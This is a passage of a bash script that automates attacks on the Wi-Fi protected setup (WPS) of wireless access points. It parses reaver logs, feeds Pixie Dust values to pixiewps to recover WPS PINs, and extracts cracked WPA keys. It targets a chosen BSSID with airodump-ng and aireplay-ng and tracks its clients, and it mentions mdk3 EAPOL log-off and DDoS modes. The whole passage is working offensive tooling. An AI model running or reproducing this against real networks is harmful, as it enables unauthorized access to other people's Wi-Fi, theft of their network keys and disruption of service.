         echo "source=zd1211,$iface,ZyDAS" >>$KISMET
         startStdIface $iface $CH
     fi
     if [ x$1 = "xstop" ] && [ x$2 = x$iface ]
     then
         stopStdIface $iface
     fi
     echo
     continue
 fi


 if [ x$DRIVER = "xacx" ] || [ x"`iwpriv $iface 2>/dev/null | grep GetAcx1`" != "x" ]
 then
     printf "$iface\t\tTI ACX1xx\tacx"
     if [ x$1 = "xstart" ] && [ x$2 = x$iface ]
     then
         cp $KISMET~ $KISMET 2>/dev/null &&
         echo "source=acx100,$iface,TI" >>$KISMET
         iwpriv $iface monitor 2 $CH 2> /dev/null >/dev/null
         startStdIface $iface $CH
     fi
     if [ x$1 = "xstop" ] && [ x$2 = x$iface ]
     then
         stopStdIface $iface
     fi
     echo
     continue
 fi


 if [ x$DRIVER = "xbcm43xx" ] || [ x"`iwpriv $iface 2>/dev/null | grep write_sprom`" != "x" ]
 then
     printf "$iface\t\tBroadcom\tbcm43xx"
     if [ x$1 = "xstart" ] && [ x$2 = x$iface ]
     then
         cp $KISMET~ $KISMET 2>/dev/null &&
         echo "source=bcm43xx,$iface,broadcom" >>$KISMET
         startStdIface $iface $CH
     fi
     if [ x$1 = "xstop" ] && [ x$2 = x$iface ]
     then
         stopStdIface $iface
         ifconfig $iface up
     fi
     echo
     continue
 fi


 if [ x$DRIVER = "xislsm" ] || [ x"`iwpriv $iface 2>/dev/null | grep set_announcedpkt`" != "x" ]
 then
    printf "$iface\t\tPrismGT\t\tislsm"
    if [ x$1 = "xstart" ] && [ x$2 = x$iface ]
    then
         startStdIface $iface $CH
    fi
    if [ x$1 = "xstop" ] && [ x$2 = x$iface ]
     then
     	stopStdIface $iface
    fi    
    echo
    continue

 fi


 if [ x$DRIVER = "xat76c503a" ] || [ x"`iwpriv $iface 2>/dev/null | grep set_announcedpkt`" != "x" ]
  then
     printf "$iface\t\tAtmel\t\tat76c503a"
     if [ x$1 = "xstart" ] && [ x$2 = x$iface ]
     then
          startStdIface $iface $CH
     fi
     if [ x$1 = "xstop" ] && [ x$2 = x$iface ]
      then
      	 stopStdIface $iface
     fi     
     echo
     continue

 fi


 if [ x$DRIVER = "xndiswrapper" ] || [ x"`iwpriv $iface 2>/dev/null | grep ndis_reset`" != "x" ]
 then
     printf "$iface\t\tUnknown\t\tndiswrapper"
     if [ x$2 = x$iface ]
     then
         echo " (MONITOR MODE NOT SUPPORTED)"
     fi
     if [ x$1 = "xstop" ] && [ x$2 = x$iface ]
     then
         stopStdIface $iface
     fi
     echo
     continue
 fi


 if [ x$DRIVER != "x" ]
 then
     if [ x$CHIPSET = "x" ]
     then
         printf "$iface\t\tUNKNOWN\t\t$DRIVER"
     else
         printf "$iface\t\t$CHIPSET\t\t$DRIVER"
     fi

     if [ x$1 = "xstart" ] && [ x$2 = x$iface ]
     then
         startStdIface $iface $CH
     fi
     if [ x$1 = "xstop" ] && [ x$2 = x$iface ]
     then
         stopStdIface $iface
     fi
     echo
     continue
 fi

printf "$iface\t\tUnknown\t\tUnknown (MONITOR MODE NOT SUPPORTED)\n"

done

echo

if [ $UDEV_ISSUE != 0 ] ; then
	echo udev renamed the interface. Read the following for a solution:
	echo http://www.aircrack-ng.org/doku.php?id=airmon-ng#interface_athx_number_rising_ath0_ath1_ath2...._ath45
	echo 
fi


}

#airmon-old_fn

#~~~~~~~~~~~~~~~~~end  airmon-ng old end ~~~~~~~~~~~~~~~~~~~~# 

#~~~~~~~~~~~~Start Pixie Dust Data Sequence Analyer Start~~~~~~~~~~~#

PDDSA_fn()
{

rm -f /tmp/Aquarius01
rm -f /tmp/Aquarius02
rm -f /tmp/Aquarius03
rm -f /tmp/Aquarius04
rm -f /tmp/nonseq.txt
rm -f /tmp/pixieseq.txt

killall -q pixiewps

######make directory for reaver output #############

PKRCOR="00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:02"

PKRERR="02:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00"

PINNUM=0


## Get BSSID


BSSID=$(cat < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD | awk -F' ' '{ if(($2 == "Waiting") && ($4 = "beacon")) {print $6}}')

#Correct Length
BSSID=$(echo $BSSID | awk '{print substr($0,0,18)}')

	if [[ $REVPIX_TYPE == 1 ]]; then

cat < /root/VARMAC_LOGS/$NAME1-$DATEFILE-$PAD | awk -F' ' '{ if(($1 == "[P]") && ($2 != "WPS")) {print $2" "$3" "$4}}' > /tmp/Aquarius01

		fi

	if [[ $REVPIX_TYPE == 2 ]]; then

cat < /root/VARMAC_LOGS/$NAME1-$DATEFILE-$PAD | awk -F' ' '{ if(($1 == "WPS:") && ($2 != "WPS")) {$1=""; print $0 }}' | sed -e 's/^[ \t]*//' > /tmp/Aquarius01

		fi

	if [[ $REVPIX_TYPE == 1 ]]; then

cat < /tmp/Aquarius01 | awk -F' ' '{ if($1 != "Access") {print $1" "$2" "$3" "$4}}' > /tmp/Aquarius02

		fi

	if [[ $REVPIX_TYPE == 2 ]]; then

cat < /tmp/Aquarius01 | awk -F' ' '{ if(($1 == "DH") || ($1 == "Enrollee") || ($1 == "E-Hash1")|| ($1 == "E-Hash2")|| ($1 == "AuthKey") || ($1 == "Registrar")) {print $0 }}' > /tmp/Aquarius02

		fi

#Add Line Number for sequence pixie data stream

	if [[ $REVPIX_TYPE == 1 ]]; then

cat -n  /tmp/Aquarius02 > /tmp/Aquarius04

		fi

	if [[ $REVPIX_TYPE == 2 ]]; then

cat < /tmp/Aquarius02 | awk -F' ' '{ if(($2 != "MAC") && ($2 != "Authentication") && ($2 != "Encryption") && ($2 != "Connection") && ($2 != "Config") && ($2 != "Wi-Fi") && ($2 != "RF") && ($2 != "Association") && ($2 != "Private") && ($2 != "public") && ($2 != "shared") && ($2 != "proved")&& ($2 != "Configuration")) {print $0 }}' |  awk '!seen[$0]++' > /tmp/Aquarius03

sleep 2

cat -n  /tmp/Aquarius03 > /tmp/Aquarius04

		fi

#remove white space from left of first word

# Find first set with possible completion

	if [[ $REVPIX_TYPE == 1 ]]; then

cat < /tmp/Aquarius04 | awk -F' ' '{ if(($2 == "E-Hash2:")) {print $1}}' > /tmp/nonseq.txt

		fi

	if [[ $REVPIX_TYPE == 2 ]]; then

cat < /tmp/Aquarius04 | awk -F' ' '{ if(($2 == "E-Hash2")) {print $1}}' > /tmp/nonseq.txt


		fi

# Search line number for further data

# E-Hash2 lines assign variables

#Line counter embed in awk

LNECNT=1

LINESTART=$(awk -v ls=$LNECNT 'NR==ls' /tmp/nonseq.txt)

# To terminate program if no Ehash2 found

LINENULL=$(awk -v ls=$LNECNT 'NR==ls' /tmp/nonseq.txt)

if [ ! -z $LINENULL ]; then

# Find total number of sequences in the file

until [ -z  $LINESTART ]; do   

	LINESTART=$(awk -v ls=$LNECNT 'NR==ls' /tmp/nonseq.txt)
	LNECNT=$(($LNECNT + 1))

		done

LNECNT=$(($LNECNT -2))

LNEND=$(($LNECNT))

LNEND=$(($LNEND))

#Reset back to line one

LNECNT=1


#until [ $BADAT == 1 ]; do


# EHash2 shows data completion back down to collect the pixie var 

BADAT=ZZZ

until [ $BADAT == 1 ]; do

LINESTART=$(awk -v ls=$LNECNT 'NR==ls' /tmp/nonseq.txt)

SEQ_fn()

{

echo -e "$txtrst"

	if [ $LINESTART > 6  ]; then

SEQ7=$LINESTART

SEQ1=$(($SEQ7 -6 ))
SEQ2=$(($SEQ7 -5 ))
SEQ3=$(($SEQ7 -4 ))
SEQ4=$(($SEQ7 -3 ))
SEQ5=$(($SEQ7 -2 ))
SEQ6=$(($SEQ7 -1 ))
SEQ7=$(($SEQ7))

	if [[ $REVPIX_TYPE == 1 ]]; then

ENONCE=$(cat < /tmp/Aquarius04 | awk -v startlne=$SEQ1 -F' ' '{ if(($1 == startlne) && ($2 == "E-Nonce:")) {print $3}}')

		fi

	if [[ $REVPIX_TYPE == 2 ]]; then

ENONCE=$(cat < /tmp/Aquarius04 | awk -v startlne=$SEQ1 -F' ' '{ if(($1 == startlne) && ($2 == "Enrollee")) {$1=$2=$3=$4=$5=""; print $0}}')

           fi


	if [[ $REVPIX_TYPE == 1 ]]; then

PKE=$(cat < /tmp/Aquarius04 | awk -v startlne=$SEQ2 -F' ' '{ if(($1 == startlne) && ($2 == "PKE:")) {print $3}}')

		fi

	if [[ $REVPIX_TYPE == 2 ]]; then

PKE=$(cat < /tmp/Aquarius04 | awk -v startlne=$SEQ4 -F' ' '{ if(($1 == startlne) && ($2 == "DH") && ($3 == "peer")) {$1=$2=$3=$4=$5=$6=$7=""; print $0}}')

		fi


	if [[ $REVPIX_TYPE == 1 ]]; then

RNONCE=$(cat < /tmp/Aquarius04 | awk -v startlne=$SEQ3 -F' ' '{ if(($1 == startlne) && ($2 == "R-Nonce:")) {print $3}}')

		fi

	if [[ $REVPIX_TYPE == 2 ]]; then

RNONCE=$(cat < /tmp/Aquarius04 | awk -v startlne=$SEQ2 -F' ' '{ if(($1 == startlne) && ($2 == "Registrar")) {$1=$2=$3=$4=$5=""; print $0}}')

		fi


	if [[ $REVPIX_TYPE == 1 ]]; then

PKR=$(cat < /tmp/Aquarius04 | awk -v startlne=$SEQ4 -F' ' '{ if(($1 == startlne) && ($2 == "PKR:")) {print $3}}')

		fi

	if [[ $REVPIX_TYPE == 2 ]]; then

PKR=$(cat < /tmp/Aquarius04 | awk -v startlne=$SEQ3 -F' ' '{ if(($1 == startlne) && ($2 == "DH") && ($3 == "own")) {$1=$2=$3=$4=$5=$6=$7=""; print $0}}')

		fi

	if [[ $REVPIX_TYPE == 1 ]]; then
 
AUTHKEY=$(cat < /tmp/Aquarius04 |awk -v startlne=$SEQ5 -F' ' '{ if(($1 == startlne) && ($2 == "AuthKey:")) {print $3}}')

HASH1=$(cat < /tmp/Aquarius04 | awk -v startlne=$SEQ6 -F' ' '{ if(($1 == startlne) && ($2 == "E-Hash1:")) {print $3}}')

HASH2=$(cat < /tmp/Aquarius04 | awk -v startlne=$SEQ7 -F' ' '{ if(($1 == startlne) && ($2 == "E-Hash2:")) {print $3}}')

	fi

	if [[ $REVPIX_TYPE == 2 ]]; then

AUTHKEY=$(cat < /tmp/Aquarius04 |awk -v startlne=$SEQ5 -F' ' '{ if(($1 == startlne) && ($2 == "AuthKey")) {$1=$2=$3=$4=""; print $0}}')

HASH1=$(cat < /tmp/Aquarius04 | awk -v startlne=$SEQ6 -F' ' '{ if(($1 == startlne) && ($2 == "E-Hash1")) {$1=$2=$3=$4=""; print $0}}')

HASH2=$(cat < /tmp/Aquarius04 | awk -v startlne=$SEQ7 -F' ' '{ if(($1 == startlne) && ($2 == "E-Hash2")) {$1=$2=$3=$4=""; print $0}}')

	fi

#Remove blank spaces beginning of variable

#	if [[ $REVPIX_TYPE == 2 ]]; then

ENONCE=$(echo $ENONCE | sed -e 's/^[ \t]*//')
RNONCE=$(echo $RNONCE | sed -e 's/^[ \t]*//')
PKR=$(echo $PKR | sed -e 's/^[ \t]*//')
PKE=$(echo $PKE | sed -e 's/^[ \t]*//')
AUTHKEY=$(echo $AUTHKEY | sed -e 's/^[ \t]*//')
HASH1=$(echo $HASH1 | sed -e 's/^[ \t]*//')
HASH2=$(echo $HASH2 | sed -e 's/^[ \t]*//')

#Replace space w/ colon

ENONCE=${ENONCE// /:}
RNONCE=${RNONCE// /:}
PKE=${PKE// /:}
PKR=${PKR// /:}
AUTHKEY=${AUTHKEY// /:}
HASH1=${HASH1// /:}
HASH2=${HASH2// /:}

bar=${bar// /:}

#	fi

if [ "$PKR" == "$PKRERR" ]; then

		PKR=$PKRCOR

    		    fi
#For debug
echo "E-Nonce: = $ENONCE"
echo "PKE: = $PKE"
echo "R-Nonce: = $RNONCE" 
echo "PKR: = $PKR"
echo "AuthKey: = $AUTHKEY"
echo "E-Hash1: = $HASH1"
echo "E-Hash2: = $HASH2"

	fi

}

SEQ_fn

if [ ${#ENONCE} = 47  ] && [ ${#PKE} = 575 ] && [ ${#RNONCE} = 47  ] && [ ${#PKR} = 575 ] && [ ${#AUTHKEY} = 95 ] && [ ${#HASH1} = 95 ] && [ ${#HASH2} = 95  ]; then

echo ""
echo -e "$info Checking Pixie Dust data sequence$yel $LNECNT$info."
sleep 3

	if [ ! -z $BSSID ]; then

	sleep 1

	pixiewps -v 3 --e-nonce $ENONCE --e-bssid $BSSID --pke $PKE --r-nonce $RNONCE --pkr $PKR --authkey $AUTHKEY --e-hash1 $HASH1 --e-hash2 $HASH2  2>&1 | tee /tmp/pixieseq.txt

			fi

	if [ -z $BSSID ]; then

	sleep 1

	pixiewps -v 3 --e-nonce $ENONCE --pke $PKE --r-nonce $RNONCE --pkr $PKR --authkey $AUTHKEY --e-hash1 $HASH1 --e-hash2 $HASH2  2>&1 | tee /tmp/pixieseq.txt

			fi

		BADAT=1
  		 
	else

		if [ $LNECNT -eq $LNEND ]; then

		BADAT=1
		echo -e "$info    Required Pixie data sequences exhausted.$txtrst"
		
			fi

		if [ $LNECNT -lt  $LNEND ]; then
					
		LNECNT=$(($LNECNT + 1))
		echo ""
		echo -e "$info    Required Pixie data incomplete trying the next sequence.$txtrst"
		sleep 1
		BADAT=0

				fi

					fi

		done

pixieseq="/tmp/pixieseq.txt"

	if [ -f  /tmp/pixieseq.txt ]; then

PINFND=$(cat < /tmp/pixieseq.txt | awk -F' ' '{ if(($1 == "[+]" ) && ($2 == "WPS") && ($3 == "pin:")) {print $2}}')

		fi

	if [ -z $PINFND ]; then

		PINFND=ZZZ

			fi

	if [ -f  /tmp/pixieseq.txt ]; then

PINFND=$(cat < /tmp/pixieseq.txt | awk -F' ' '{ if(($1 == "[+]" ) && ($2 == "WPS") && ($3 == "pin:")) {print $2}}')

		fi

	if [ -z $PINFND ]; then

		PINFND=ZZZ

			fi

	if [ $PINFND != WPS ]; then

		clear

			fi
      

			fi

if [ -z  $LINENULL ]; then

echo ""
echo -e "$txtrst    WPS Pin Not Found."
echo -e "$txtrst"

sleep 3


		fi

if [[ $LNELFT == 1 && $PINFND != WPS ]] || [[ $LNEND = 1 && $PINFND != WPS ]]; then

echo ""
echo -e "$txtrst    WPS Pin Not Found."
echo -e "$txtrst"

sleep 3

		fi

if [[ $PINFND == WPS ]]; then

WPSPIN=$(cat < /tmp/pixieseq.txt | awk -F' ' '{ if(($1 == "[+]" ) && ($2 == "WPS") && ($3 == "pin:")) {print $4}}')

echo ""
echo -e "$txtrst    WPS Pin Found!"
echo ""
echo -e "$txtrst    WPS Pin = $WPSPIN"
echo ""
echo -e "$txtrst    Loading WPS Pin into reaver"

		USE_PIN1=y
		WPS_PIN1=$WPSPIN
                WPS_COMTEST=y
		USE_PIXIE=n
		PIXIE_OVERIDE=1

echo -e "$txtrst"

		fi

sleep 5

}

#~~~~~~~~~~~~End Pixie Dust Data Sequence Analyer End~~~~~~~~~~~~~#

#~~~~~~~~~~~~~~Start Make monitor mac address variables Start~~~~~~~~~~~#

MONMAC_fn()

{



		if [[ $ifselect == old ]]; then

            MONMAC0=$(ifconfig $MON | awk '{print $5}')
            sleep 0.5
            MONMAC0=$(echo $MONMAC0 | awk '{print $1}')

			fi

		if [[ $ifselect == new ]]; then

	MONMAC0=$(ifconfig $MON | awk '{if ($1 == "ether") {print $2}}') 2>/dev/null

			fi

#MONMAC0=$(ifconfig $MON | grep "$MON      Link encap:UNSPEC  HWaddr " | sed s/"$MON      Link encap:UNSPEC  HWaddr "//g)

# Shorten to length of 17

MONMAC0=$(echo $MONMAC0 | awk '{print substr($0,0,17)}')

# Replace - dash with : colon - Some programs may not accept dash

MONMAC0=$(echo $MONMAC0 | tr - :)

# Remove text in front of string

		if [[ $ifselect == old ]]; then

            MONMAC01=$(ifconfig $MON1 | awk '{print $5}')
            sleep 0.5
            MONMAC01=$(echo $MONMAC01 | awk '{print $1}')

			fi

		if [[ $ifselect == new ]]; then

	MONMAC01=$(ifconfig $MON1 | awk '{if ($1 == "ether") {print $2}}') 2>/dev/null

			fi


#MONMAC1=$(ifconfig $MON1 | grep "$MON1      Link encap:UNSPEC  HWaddr " | sed s/"$MON1      Link encap:UNSPEC  HWaddr "//g)

# Shorten to length of 17

MONMAC1=$(echo $MONMAC1 | awk '{print substr($0,0,17)}')

# Replace - dash with : colon - Some programs may not accept dash

MONMAC1=$(echo $MONMAC1 | tr - :)

# Remove text in front of string

		if [[ $ifselect == old ]]; then

            MONMAC02=$(ifconfig $MON2 | awk '{print $5}')
            sleep 0.5
            MONMAC02=$(echo $MONMAC02 | awk '{print $1}')

			fi

		if [[ $ifselect == new ]]; then

	MONMAC02=$(ifconfig $MON2 | awk '{if ($1 == "ether") {print $2}}') 2>/dev/null

			fi

#MONMAC2=$(ifconfig $MON2 | grep "$MON2      Link encap:UNSPEC  HWaddr " | sed s/"$MON2      Link encap:UNSPEC  HWaddr "//g)

# Shorten to length of 17

MONMAC2=$(echo $MONMAC2 | awk '{print substr($0,0,17)}')

# Replace - dash with : colon - Some programs may not accept dash

MONMAC2=$(echo $MONMAC2 | tr - :)

}

#~~~~~~~~~~~~~~End Make monitor mac address variables End~~~~~~~~~~~#

#~~~~~~~~~~~~~~~Start Cleanup on ctrl-c Start~~~~~~~~~~~~~~~#
cleanup()

{
killall -q tkiptun-ng
killall -q airodump-ng
killall -q aireplay-ng
killall -q wash
killall -q reaver 
killall -q mdk3
# Debug xterm May cause problem with other programs
sleep .1
killall -q xterm
# Debug xterm May cause problem with other programs

airmon-old_fn stop mon10 &> /dev/null
sleep .1
airmon-old_fn stop mon9 &> /dev/null
sleep .1
airmon-old_fn stop mon8 &> /dev/null
sleep .1
airmon-old_fn stop mon7 &> /dev/null
sleep .1
airmon-old_fn stop mon6 &> /dev/null
sleep .1
airmon-old_fn stop mon5 &> /dev/null
sleep .1
airmon-old_fn stop mon4 &> /dev/null
sleep .1
airmon-old_fn stop mon3 &> /dev/null
sleep .1
airmon-old_fn stop mon2 &> /dev/null
sleep .1
airmon-old_fn stop mon1 &> /dev/null
sleep .1
airmon-old_fn stop mon0 &> /dev/null
sleep .1
echo -e " $txtrst"
echo "  Removing card from monitor mode and Restarting network-manager"

# chunkingz [edit]:
# I noticed after pressing ctrl+C and program exits, my card remains in monitor mode
# when you check with iwconfig you can easily see this.
# Hence this modification...

ifconfig wlan0 down 2> /dev/null > /dev/null
sleep 1
iwconfig wlan0 mode managed 2> /dev/null > /dev/null
sleep 1
ifconfig wlan0 up 2> /dev/null > /dev/null
sleep 1

	service network-manager restart 2> /dev/null > /dev/null
	sleep 1
	service NetworkManager restart 2> /dev/null > /dev/null
	sleep 1
	service avahi-daemon restart 2> /dev/null > /dev/null

	echo ""
	echo -e "[+] If wifi functions are NOT shortly restored?."
	echo -e "[+] Suggest you reboot the computer before proceeding." 
	sleep 3

	echo -e " $txrst"
	echo -e "[+]     There are no secrets"
        echo -e "[+]             but" 
        echo -e "[+] the secrets that keep themselves"
        echo -e "[+]"
	echo -e "[+] May the password be with you."
	echo -e "[+]      Luke Codewalker"
	echo -e "[+] Happy Trails From Musket Teams."


echo ""


sleep .1
rm -f configlist.txt
rm -f /tmp/tarap*
rm -f /tmp/*-clients.txt
rm -f /tmp/test12345670
rm -f /tmp/CONFIGHOLD.txt

return $?

}

control_c()

{

echo " Ending program"
cleanup
sleep 2
exit $?

}

trap control_c SIGINT

#~~~~~~~~~~~~~~~End Cleanup on ctrl-c End~~~~~~~~~~~~~~~#

#~~~~~~~~~~~~~~~Start Pin Found Start~~~~~~~~~~~~~~~#

PINFOUND_fn()
{

	if [ -f  VARMAC_LOGS/$NAME1-$DATEFILE-$PAD ]; then

PINFND=$(cat < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD | awk -F' ' '{ if(($1 == "[+]" ) && ($2 == "WPS") && ($3 == "PIN:")) {print $3}}')

		fi

	if [ -z $PINFND ]; then

		PINFND=ZZZ

			fi
	
	if [[ $PINFND == PIN: ]]; then

WPSPIN=$(cat < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD | awk -F' ' '{ if(($1 == "[+]" ) && ($2 == "WPS") && ($3 == "PIN:")) {print $4}}')

WPAKEY=$(cat < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD | awk -F' ' '{ if(($1 == "[+]" ) && ($2 == "WPA")) {print $4}}')

APSSID=$(cat < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD | awk -F' ' '{ if(($1 == "[+]" ) && ($2 == "AP") && ($3 == "SSID:")) {print $4" "$5" "$6" "$7" "$8 }}')

echo ""
echo -e "$txtrst    Pin cracked"
echo ""
echo -e "$txtrst    WPS Pin: = $WPSPIN"
echo -e "$txtrst    WPA Key: = $WPAKEY"
echo -e "$txtrst    AP SSID: = $APSSID"
echo""
echo -e "$txtrst    See file VARMAC_LOGS/$NAME1-$DATEFILE-$PAD"
echo -e " "

control_c

		fi
}

#~~~~~~~~~~~~~~~End Pin Found End~~~~~~~~~~~~~~~#


echo ""
echo ""
echo -e "  Clearing ALL monitors, reaver, wash, mdk3 and aireplay-ng etc - please wait."
echo -e "  Shutting down network-manager."
echo -e "  Network-manager will be restarted when program closed."
# Required by kali airmon-ng check kill
service network-manager stop 2> /dev/null > /dev/null
service NetworkManager stop 2> /dev/null > /dev/null
service avahi-daemon stop 2> /dev/null > /dev/null
sleep 3
# service restarted when program closed

sleep .1
killall -q tkiptun-ng
killall -q airodump-ng
killall -q aireplay-ng
killall -q wash
killall -q reaver 
killall -q mdk3
sleep .1
killall -q xterm

#clearing old monitors

airmon-old_fn stop mon10 &> /dev/null
sleep .1
airmon-old_fn stop mon9 &> /dev/null
sleep .1
airmon-old_fn stop mon8 &> /dev/null
sleep .1
airmon-old_fn stop mon7 &> /dev/null
sleep .1
airmon-old_fn stop mon6 &> /dev/null
sleep .1
airmon-old_fn stop mon5 &> /dev/null
sleep .1
airmon-old_fn stop mon4 &> /dev/null
sleep .1
airmon-old_fn stop mon3 &> /dev/null
sleep .1
airmon-old_fn stop mon2 &> /dev/null
sleep .1
airmon-old_fn stop mon1 &> /dev/null
sleep .1
airmon-old_fn stop mon0 &> /dev/null

rm -f configlist.txt
rm -f /tmp/tarap02.txt
rm -f /tmp/tarap03.txt
rm -f /tmp/tarap04.txt
rm -f /tmp/tarap05.txt
rm -f /tmp/tarap06.txt
rm -f /tmp/tarap*
rm -f /tmp/*-clients.txt
rm -f /tmp/CONFIGHOLD.txt
clear


#~~~~~~~~~~~~~~~Start Find Client Asssociated Start~~~~~~~~~~~~~~~#

ASSOC_CLIENT_fn()

{

if [ ! -d "VARMAC_AIRCRACK" ]; then

    mkdir -p -m 700 VARMAC_AIRCRACK;

	fi


if [ -f  /tmp/tarap-01.csv ]; then

#Leave only lines with Possible data

cat < /tmp/tarap-01.csv | awk -F' ' '{print $1" "$7" "$8}' > /tmp/tarap01.txt

#Remove commas

cat < /tmp/tarap01.txt | awk -F"," '/1/ {print $1 $2 $3  }' > /tmp/tarap02.txt

#Strip down to three(3) entries 

cat < /tmp/tarap02.txt | awk -F' ' '{ if((length($3) == 17 )) {print $0 }}' > /tmp/tarap03.txt

#Remove the mon0 ie data produced by self from the list

#Move to uppercase to match aircrack-ng text output

MACRMV="$VARMAC"

MACRMV=$(echo $MACRMV | awk '{print toupper($0)}')

cat < /tmp/tarap03.txt | awk -v mon=$MACRMV -F' ' '{ if($1 != mon ) {print $0}}' > /tmp/tarap04.txt

#Remove all but target

cat < /tmp/tarap04.txt | awk -v targetap=$TARGETAP1 -F' ' '{ if($3 == targetap) {print $0}}' > /tmp/tarap05.txt

#Print file with just data value could remove if statement

#Find highest value

cat < /tmp/tarap05.txt | awk -v targetap=$TARGETAP1 -F' ' '{ if($3 == targetap) {print $2}}' > /tmp/tarap06.txt

#### Start Working ###

#### Build History of associated macs####

if [ ! -f  "/root/VARMAC_AIRCRACK/$TARGETAP-client.txt" ]; then

	touch /root/VARMAC_AIRCRACK/$TARGETAP1-client.txt

	fi

if [ ! -f  "/root/VARMAC_AIRCRACK/$TARGETAP-client.txt" ]; then

	touch /tmp/$TARGETAP1-client.txt

	fi

MAXDAT=$(awk '{for(i=1;i<=NF;i++) if($i>maxval) maxval=$i;}; END { print maxval;}' /tmp/tarap06.txt)

CLIASO_MAX=$(cat < /tmp/tarap05.txt | awk -v maxdat=$MAXDAT -F' ' '{ if($2 == maxdat) {print $1}}')

cat < /tmp/tarap05.txt | awk -v maxdat=$MAXDAT -F' ' '{ if($2 != maxdat) { print $0 }}' > /tmp/tarap05a.txt

#Find middle value of top three

cat < /tmp/tarap05a.txt | awk -v maxdat=$MAXDAT -F' ' '{ if($2 != maxdat) {print $2}}' > /tmp/tarap06a.txt

MAXDAT=$(awk '{for(i=1;i<=NF;i++) if($i>maxval) maxval=$i;}; END { print maxval;}' /tmp/tarap06a.txt)

CLIASO_MID=$(cat < /tmp/tarap05a.txt | awk -v maxdat=$MAXDAT -F' ' '{ if($2 == maxdat) {print $1}}')

cat < /tmp/tarap05a.txt | awk -v maxdat=$MAXDAT -F' ' '{ if($2 != maxdat) {print $0}}' > /tmp/tarap05b.txt

cat < /tmp/tarap05b.txt | awk -v maxdat=$MAXDAT -F' ' '{ if($2 != maxdat) {print $2}}' > /tmp/tarap06b.txt

MAXDAT=$(awk '{for(i=1;i<=NF;i++) if($i>maxval) maxval=$i;}; END { print maxval;}' /tmp/tarap06b.txt)

CLIASO_LOW=$(cat < /tmp/tarap05b.txt | awk -v maxdat=$MAXDAT -F' ' '{ if($2 == maxdat) {print $1}}')

#Write variables for histoical record

	if [ ! -z $CLIASO_MAX ]; then

		echo "$CLIASO_MAX" >> /tmp/$TARGETAP1-client.txt

			fi

	if [ ! -z $CLIASO_MID ]; then

		echo "$CLIASO_MID" >> /tmp/$TARGETAP1-client.txt

			fi

	if [ ! -z $CLIASO_LOW ]; then

		echo "$CLIASO_LOW" >> /tmp/$TARGETAP1-client.txt

			fi

cat < /root/VARMAC_AIRCRACK/$TARGETAP1-client.txt >> /tmp/$TARGETAP1-client.txt

rm -f /root/VARMAC_AIRCRACK/$TARGETAP1-client.txt

cat < /tmp/$TARGETAP1-client.txt | sort -u > /root/VARMAC_AIRCRACK/$TARGETAP1-client.txt

rm -f /tmp/$TARGETAP1-client.txt


	if [ $MDKTYPE1 -lt 16 ]; then

echo ""
echo -e "     If a EAPOL log off attack has been selected in the configuration file."
echo -e "  This attack type requires clients to be associated"
echo -e "  If no clients are seen attack type will change to DDOS"

		fi

######

echo ""
echo -e "$info   For Clients that have been seen associated to $TARGETAP1 see:$txtrst"
echo ""
echo -e "$txtrst  root/VARMAC_AIRCRACK/$TARGETAP1-client.txt"
echo ""
echo -e "$info   Clients currently associated to $TARGETAP1 are seen below:$txtrst"
echo ""

#check var not null
if [ ! -z $CLIASO_MAX ]; then

echo -e "$txtst  $CLIASO_MAX"
echo "  $CLIASO_MID"
echo "  $CLIASO_LOW"

	else

	echo -e "$txtrst   No clients are currently associated to $TARGETAP1"

		fi
######

fi

}

#~~~~~~~~~~~~~~~End Find Client Asssociated End~~~~~~~~~~~~~~~#

#~~~~~~~~~~~~~~~Start Airodump Association Search Start~~~~~~~~~~~~~~# 

AIRDASSOC_fn()
{

#Write a file to check for clients assoc

#CLIENT_ASSOC=

# Specific channel

if [[ $CHANNEL1 -gt 0 && $CHANNEL1 -le 14 ]]  && [[ $MDKTYPE1 -lt 16 ]]; then

xterm -g 80x15-1+400    -T "Airodump-ng" -e "airodump-ng -c $CHANNEL1 --bssid $TARGETAP1 -w /tmp/tarap $MON" &

		fi

#Channel hopping Turned off seems to conflict w. reaver

#if [[ $CHANNEL1 -eq 0 ]] && [[ $MDKTYPE1 -lt 16 ]]; then

#xterm -g 80x15-1+400    -T "Airodump-ng" -e "airodump-ng --bssid $TARGETAP1 -w /tmp/tarap $MON" &

#		fi

}

#~~~~~~~~~~~~~~~End Airdump association End~~~~~~~~~~~~~~~#


#~~~~~~~~~~~~~~~Start Aireplay-ng Start~~~~~~~~~~~~~~~#

AIREPLAY_fn()
{

if [[ $CHANNEL1 -gt 0 && $CHANNEL1 -le 14 ]]  && [[ $USE_AIRE1 == y || $USE_AIRE1 == Y ]]; then

sleep 10

xterm -g 80x5-1+220    -T "Aireplay-ng Reception Test/AP Activation" -e "aireplay-ng -1 10 -a $TARGETAP1 -q 4 $MON" &

sleep 1

